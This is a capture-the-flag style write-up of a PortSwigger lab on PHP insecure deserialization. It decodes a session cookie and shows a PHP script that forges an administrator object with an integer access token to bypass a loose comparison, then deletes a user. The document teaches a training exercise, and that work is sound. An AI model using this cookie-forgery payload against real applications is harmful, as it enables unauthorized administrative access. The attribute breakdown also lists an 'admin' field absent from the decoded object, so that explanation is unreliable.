# Modifying serialized data types

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types), you'll learn: Modifying serialized data types! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the `administrator` account. Then, delete Carlos.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-2/images/Pasted%20image%2020230110054047.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-2/images/Pasted%20image%2020230110054121.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-2/images/Pasted%20image%2020230110054104.png)

When we successfully logged in, it'll set a new session cookie.

**URL decoded:**
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpYzRnanAybGN4bnd2dmlrYjhhOWUwMm0wYjd4NXhiayI7fQ==
```

As you can see, the session cookie's last 2 characters are `=`, which is a padding in base64.

**Let's base64 decode that:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# echo -n 'Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpYzRnanAybGN4bnd2dmlrYjhhOWUwMm0wYjd4NXhiayI7fQ==' | base64 -d
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ic4gjp2lcxnwvvikb8a9e02m0b7x5xbk";}
```

It's a PHP deserialized object!

Let's break it down:

- `O:4:"User"` means there is an `User` object, and it's length is 4 characters long
- `2` means there are 2 attributes:
    - `s:8:"username"` means the **first attribute** is called `username`, and it's length is 8 characters long
        - `s:6:"wiener"` means `username` attribute value is `wiener`, and it's length is 6 characters long
    - `s:5:"admin"` means the **second attribute** is called `admin`, and it's length is 5 characters long
        - `b:0` means the `admin` attribute value is boolean value `0` (`false`)
    - `s:12:"access_token"` means the **third attribute** is called `access_token`, and it's length is 12 characters long
        - `s:32:"ic4gjp2lcxnwvvikb8a9e02m0b7x5xbk"` means the `access_token` attribute value is `ic4gjp2lcxnwvvikb8a9e02m0b7x5xbk`, and it's length is 32 characters long

Armed with above information, we can take a closer look at the `access_token` attribute.

**The 32 characters long of string looks like a hash. We can use `hash-identifier` to identify the hash algorithm:**
```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# hash-identifier 'ic4gjp2lcxnwvvikb8a9e02m0b7x5xbk'
[...]
Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
[...]
```

It's a MD5 hash!

So, the `access_token` is checking we're authenticated or not.

**Since we have control to the deserialized object, we can modify it.**

If the web application is using loose comparison (`==`), we can modify the deserialized object to bypass the authentication!

**Let's assume the web application is checking the `access_token` like this:**
```php
$User = unserialize($_COOKIE);

if ($User['access_token'] == $password){
    // Login successful
};
```

We can just change the data type of `access_token` attribute to an integer!

**To do so, we can write a PHP code:**
```php
<?php
    $serializedObject = 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}';

    $deserializedObject = unserialize($serializedObject);
    echo "[+] Deserialized: \n";
    var_dump($deserializedObject);

    echo "[+] Base64 encoded: \n" . base64_encode($serializedObject);
?>
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Insecure-Deserialization]
└─# php serialization.php
[+] Deserialized: 
object(__PHP_Incomplete_Class)#1 (3) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(4) "User"
  ["username"]=>
  string(13) "administrator"
  ["access_token"]=>
  int(0)
}
[+] Base64 encoded: 
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

Notice that the `access_token` attribute's data type is set to integer with value 0, and the `username` attribute's value changed to `administrator`.

When we changed the session cookie, we'll be logged in as user `administrator`, as the `access_token` is equal to `true`.

This happens because PHP will attempt to convert the string to an integer, meaning that `5 == "5"` evaluates to `true`. So our integer `0` will always be true, as there is no number in `the access_token`.

**Let's modify our session cookie to our newly modified serialized object in base64 encoding:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-2/images/Pasted%20image%2020230110061905.png)

**Then refresh the page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-2/images/Pasted%20image%2020230110061918.png)

Nice! We see an admin panel. Let's delete user `carlos`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-2/images/Pasted%20image%2020230110061944.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-2/images/Pasted%20image%2020230110061950.png)

# What we've learned:

1. Modifying serialized data types